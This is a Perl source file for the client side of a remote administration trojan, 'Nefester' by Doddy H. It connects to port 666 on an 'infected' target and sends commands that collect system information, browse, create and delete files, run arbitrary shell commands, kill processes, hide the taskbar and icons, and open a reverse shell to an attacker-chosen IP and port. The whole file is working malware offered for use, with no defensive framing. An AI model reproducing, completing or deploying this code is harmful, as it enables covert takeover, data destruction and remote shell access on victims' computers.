#!usr/bin/perl
#Nefester (Cliente) 0.1 By Doddy H


use IO::Socket;
use Cwd;

&menu;

sub head {

system 'cls';

print q(


            E      F                   TT    E        
NNNNNNNEEEEEE FFFFFF   AAA   SSSSSTTTTTTEEEEEE RRRRRR 
 NN NN  E EE   FFFF   A AA  S  S T TT T  E EE   RRRRR 
 NNNNN  E EE   FF F   AAAAA S     T TT   E EE   RR  R 
 NNNNN EEEEE  FFFFF  AAA AA  SSS S  TT  EEEEE  RRRRR  
 NNNNN  E EEE  FFF    AAAAA S  SSS  TT   E EEE  RR R  
 NN NN  EEEE E FF    AAA AA SS  SS  TT   EEEE E RR  R 
NNN NN EEEEEEEFFFF  AAA  AAA  SSS  TTTT EEEEEEE RRR RR
                            SS                 R   R  



);

}

sub menu {

&head;

print "[Target] : ";
chomp(my $ip = <STDIN>);



my $socket = new IO::Socket::INET( 
PeerAddr => $ip,
PeerPort => 666,
Proto => 'tcp',
Timeout  => 5
);

if ($socket) {
$socket->close;
&menuo($ip);
} else {
print "\n\n[-] Target no infectado\n";
<STDIN>;
&menu; 
}

}

sub menuo {

&head;

print "[$_[0]] : Servidor Activado\n\n";
print q(
1 : Informacion
2 : Navegador
3 : Abrir CD
4 : Cerrar CD
5 : Puertos abiertos
6 : Mensaje
7 : CMD
8 : Esconder barra de tareas
9 : Devolver barra de tareas
10 : Esconder iconos
11 : Devolver iconos
12 : Administrar procesos
13 : Reverse Shell
14 : Cambiar IP
15 : Salir


);
print "[Opcion] : ";
chomp(my $opcion = <STDIN>);


if ($opcion eq 1) {
print "\n\n[+] Informacion\n\n";
$re = daryrecibir($_[0],"infor");
if ($re=~/:(.*):(.*):(.*):(.*):(.*):/) {
print "[Dominio] : $1\n";
print "[Chip] : $2\n";	
print "[Version] : $3\n";	
print "[Nombre] : $4\n";	
print "[OS] : $5\n";
<stdin>;
} 
&menuo($_[0]);
} 
elsif ($opcion eq 2) {

menu1:
print "\n\n[+] Navegacion de archivos\n\n";
$cwd = daryrecibir($_[0],"getcwd"."\r\n");
print "tengo $cwd\n";
show($_[0],"/");
&menu2;

sub menu2 {
print "\n\n[Opciones]\n\n";
print "1 - Cambiar directorio\n";
print "2 - Crear archivo\n";
print "3 - Borrar archivo\n";
print "4 - Borrar directorio\n";
print "5 - Reproducir musica\n";
print "6 - Parar reproduccion\n";
print "7 - Volver al menu inicial\n\n";
print "[Opcion] : ";
chomp(my $op = <stdin>);

if ($op eq 1) {
print "\n\n[+] Directorio : ";
chomp (my $dir=<stdin>);
$ver = daryrecibir($_[0],"chdirnow K0BRA".$dir."K0BRA");
if ($ver=~/ok/ig) {
print "\n\n[+] Directory changed\n\n";
}
show($_[0],$dir);
&menu2;
<stdin>;
}

elsif ($op eq 2) {

print "\n\n[Nombre] : ";
chomp(my $name = <stdin>);
print "\n\n[Contenido] : ";
chomp(my $code = <stdin>);

daryrecibir($_[0],"crearnow K0BRA".$name."K0BRA ACATOY".$code."ACATOY");

print "\n\n[+] Archivo creado \n\n";
<stdin>;
}
elsif ($op eq 3) {
print "\n\n[Archivo a borrar] : ";
chomp(my $file = <stdin>);
$re = daryrecibir($_[0],"borrarfile K0BRA".$file."K0BRA");
if ($re=~/ok/) {
print "\n\n[+] Archivo Borrado\n\n";
} else {
print "\n\n[-] Error\n\n";
}
<stdin>;
}

elsif ($op eq 4) {
print "\n\n[Directorio a borrar] : ";
chomp(my $file = <stdin>);
$re = daryrecibir($_[0],"borrardir K0BRA".$file."K0BRA");
if ($re=~/ok/) {
print "\n\n[+] Directorio Borrado\n\n";
} else {
print "\n\n[-] Error\n\n";
}
<stdin>;
}

elsif ($op eq 5) {
print "\n\n[Archivo] : ";
chomp(my $file = <stdin>);
print "\n\n[+] Reproduciendo\n\n";
daryrecibir($_[0],"playmusic K0BRA".$file."K0BRA");
<stdin>;
}
elsif ($op eq 6) {
print "\n\n[+] Reproduccion detenida\n\n";
daryrecibir($_[0],"pararmusic");
<stdin>;
}
elsif ($op eq 7) {
&menuo($_[0]);
}
else {
show($_[0],"/");
}
goto menu1;
}
}

elsif ($opcion eq 3) {
daryrecibir($_[0],"opencd");
&menuo($_[0]);
}

elsif ($opcion eq 4) {
daryrecibir($_[0],"closedcd");
&menuo($_[0]);
}

elsif ($opcion eq 5) {
print "\n[Puertos Abiertos]\n\n";
$re = daryrecibir($_[0],"porters");
while ($re=~/:(.*?):/ig) {
if ($1 ne "") {
print "[+] $1\n";
}
}
<stdin>;
&menuo($_[0]);
}
elsif ($opcion eq 6) {
print "\n[Mensaje] : ";
chomp (my $msg = <stdin>);
daryrecibir($_[0],"msgbox $msg");
<stdin>;
&menuo($_[0]);
} 
elsif ($opcion eq 7) {

menu:

my $cmd,$re;

print "\n\n>";

chomp(my $cmd= <stdin>);

if ($cmd=~/exit/ig) {
&menuo($_[0]);
}

$re = daryrecibir($_[0],"comando :$cmd:");
print "\n".$re;
goto menu;
&menuo($_[0]);
}
elsif ($opcion eq 8) {
daryrecibir($_[0],"iniciochau");
&menuo($_[0]);
}
elsif ($opcion eq 9) {
daryrecibir($_[0],"iniciovuelve");
&menuo($_[0]);
}
elsif ($opcion eq 10) {
daryrecibir($_[0],"iconochau");
&menuo($_[0]);
}
elsif ($opcion eq 11) {
daryrecibir($_[0],"iconovuelve");
&menuo($_[0]);
}

elsif ($opcion eq 12) {

&reload($_[0]);

sub reload {

my @pro;
my @pids;

my $sockex = new IO::Socket::INET( 
PeerAddr => $_[0],
PeerPort => 666,
Proto => 'tcp',
Timeout  => 5
);

print $sockex "mostrarpro"."\r\n";
$sockex->read($re,5000);
$sockex->close;

chomp $re;

print "\n\n[+] Procesos encontrados\n\n";

while ($re=~/PROXEC(.*?)PROXEC/ig) {
if ($1 ne "") {
push(@pro,$1);
}
}

while ($re=~/PIDX(.*?)PIDX/ig) {
if ($1 ne "") {
push(@pids,$1);
}
}

$cantidad = int(@pro);

for my $num(1..$cantidad) {
if ($pro[$num] ne "") {
print "\n[+] Proceso : ".$pro[$num]."\n";
print "[+] PIDS : ".$pids[$num]."\n"; 
}
}

print q(

[Opciones]


1 - Refrescar lista
2 - Cerrar procesos
3 - Volver al menu
 
);

print "\n[Opcion] :  ";
chomp(my $opc = <stdin>);

if ($opc=~/1/ig) {
&reload($_[0]);
}
elsif($opc=~/2/ig) {
print "\n[+] Write the name of the process : ";
chomp(my $numb = <stdin>);
print "\n[+] Write the PID of the process : ";
chomp(my $pid = <stdin>);
$re = daryrecibir($_[0],"chauproce K0BRA".$pid."K0BRA".$numb."K0BRA");
if ($re=~/ok/ig) {
print "\n\n[+] Proceso cerrado\n\n";
} else {
print "\n\n[-] Error\n\n";
}
<stdin>;
&reload($_[0]);
}
elsif($opc=~/3/ig) {
&menuo($_[0]);
}
else {
&reload;
}
}
}

elsif ($opcion eq 13) {
print "\n\n[IP] : ";
chomp(my $ip = <stdin>);
print "\n\n[Port] : ";
chomp(my $port = <stdin>);
print "\n\n[+] Connected !!!\n\n";
$re = daryrecibir($_[0],"backshell :$ip:$port:");
}
elsif ($opcion eq 14) {
&menu;
}
elsif ($opcion eq 15) {
exit 1;
}	
else {
&menuo;
}
}

sub daryrecibir {

my $sockex = new IO::Socket::INET( 
PeerAddr => $_[0],
PeerPort => 666,
Proto => 'tcp',
Timeout  => 5
);

print $sockex $_[1]."\r\n";
$sockex->read($re,5000);
$sockex->close;
return $re."\r";
}

sub show {

my $re = daryrecibir($_[0],"getcwd"."\r\n");
print "\n\n[+] Directorio Actual : $re\n\n";
$re1 = daryrecibir($_[0],"dirnow ACATOY".$re."ACATOY"."\r\n");
print "\n\n[Directorios]\n\n";

while ($re1=~/DIREX(.*?)DIREX/ig) {
if ($1 ne "") {
print "[+] $1\n";
}
}
	
print "\n\n[Archivos]\n\n";

while ($re1=~/FILEX(.*?)FILEX/ig) {
if ($1 ne "") {
print "[+] $1\n";
}
}

}

#
# ¿ The End ? 
#